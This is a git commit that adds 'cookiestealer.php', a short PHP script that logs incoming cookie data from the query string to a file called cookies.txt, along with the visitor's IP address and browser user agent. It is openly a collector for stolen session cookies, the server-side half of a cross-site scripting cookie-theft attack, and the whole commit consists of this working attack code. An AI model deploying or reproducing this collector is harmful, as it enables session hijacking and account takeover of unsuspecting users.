a3d7dc989e9d0be611ff65440df79d9e2aae5a5c
UbuntuStrike <30779753+UbuntuStrike@users.noreply.github.com>
2019-03-23 22:06:06 -0600

    Create cookiestealer.php

---
+++ cookiestealer.php
@@ -0,0 +1,15 @@
+<?php 
+$ip = getenv('REMOTE_ADDR');
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$cookie = urldecode($_SERVER['QUERY_STRING']);
+$file = "cookies.txt";
+$fp = fopen($file, 'w');
+ 
+fwrite($fp, $browser. PHP_EOL);
+ 
+fwrite($fp, $cookie. PHP_EOL);
+
+fwrite($fp, $ip. PHP_EOL);
+ 
+fclose($fp);﻿
+?>﻿
